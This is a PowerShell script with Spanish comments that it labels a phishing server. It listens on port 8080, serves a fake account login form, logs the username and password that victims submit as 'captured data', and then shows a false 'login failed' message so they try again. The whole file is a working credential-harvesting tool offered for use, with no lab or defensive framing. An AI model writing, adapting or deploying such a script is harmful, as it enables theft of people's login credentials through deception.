# Crear servidor web básico en el puerto 8080
$listener = New-Object System.Net.HttpListener
$listener.Prefixes.Add("http://*:8080/")
$listener.Start()

Write-Host "Servidor phishing iniciado en http://localhost:8080/"

while ($listener.IsListening) {
    $context = $listener.GetContext()
    $request = $context.Request
    $response = $context.Response

    if ($request.HttpMethod -eq "GET") {
        $html = @"
        <html>
            <body>
                <h2>Iniciar sesión en su cuenta</h2>
                <form method="POST">
                    Usuario: <input type="text" name="user"><br>
                    Contraseña: <input type="password" name="pass"><br>
                    <input type="submit" value="Iniciar Sesión">
                </form>
            </body>
        </html>
"@
        $buffer = [System.Text.Encoding]::UTF8.GetBytes($html)
        $response.ContentLength64 = $buffer.Length
        $response.OutputStream.Write($buffer, 0, $buffer.Length)
        $response.OutputStream.Close()
    }

    if ($request.HttpMethod -eq "POST") {
        $body = New-Object System.IO.StreamReader($request.InputStream)
        $data = $body.ReadToEnd()
        $body.Close()

        Write-Host "Datos capturados: $data"

        # Responder al cliente
        $html = "<html><body>Inicio de sesión fallido. Inténtelo nuevamente.</body></html>"
        $buffer = [System.Text.Encoding]::UTF8.GetBytes($html)
        $response.ContentLength64 = $buffer.Length
        $response.OutputStream.Write($buffer, 0, $buffer.Length)
        $response.OutputStream.Close()
    }
}
